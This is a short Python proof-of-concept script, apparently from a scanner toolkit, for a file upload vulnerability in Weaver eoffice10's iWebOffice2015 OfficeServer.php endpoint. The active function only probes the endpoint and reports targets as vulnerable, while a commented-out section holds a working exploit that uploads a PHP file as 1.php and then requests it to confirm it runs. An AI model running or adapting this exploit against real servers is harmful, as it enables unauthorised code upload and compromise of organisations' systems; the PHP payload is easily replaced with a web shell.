#!/usr/bin/env python3
# _*_ coding:utf-8 _*_

from urllib import response
import requests
from requests_toolbelt import MultipartEncoder
from Config.config_requests import ua

requests.packages.urllib3.disable_warnings()
# 脚本信息
######################################################
NAME = 'eoffice10_upload'
AUTHOR = "JDQ"
REMARK = '泛微 eoffice10 文件上传漏洞'
FOFA_RULE = ''
######################################################

headers = {
    "User-Agent": ua
}


# stra = '''

# <?php
# echo "helloworld";
# ?>
# '''
# m = MultipartEncoder(
#     fields={
#         "FileData": ("nonono.php", stra),
#         "FormData": (None, str({'USERNAME': 'admin', 'RECORDID': 'undefined', 'OPTION': 'SAVEFILE', 'FILENAME': '1.php'}))
#     },
#     boundary='----WebKitFormBoundaryLpoiBFy4ANA8daew'
# )
# headers['Content-Type'] = m.content_type


def poc(target):
    try:
        r = requests.get(target+'/eoffice10/server/public/iWebOffice2015/OfficeServer.php',
                         headers=headers, verify=False, timeout=5)
        if r.status_code == 200 and r.headers['Content-Length'] == "0":
            print("[+] 目标 {} 存在漏洞".format(target))

    except Exception as e:
        pass


# def poc(target):
#     try:
#         r = requests.post(
#             target+'/eoffice10/server/public/iWebOffice2015/OfficeServer.php',
#             headers=headers, data=m, verify=False, timeout=5)
#         if r.status_code == 200:
#             r = requests.get(
#                 target+'/eoffice10/server/public/iWebOffice2015/Document/1.php', headers=headers, verify=False, timeout=5)
#             print("[+] 目标 {} 存在漏洞".format(target), r.text)

#     except Exception as e:
#         pass


if __name__ == '__main__':
    poc("http://127.0.0.1")
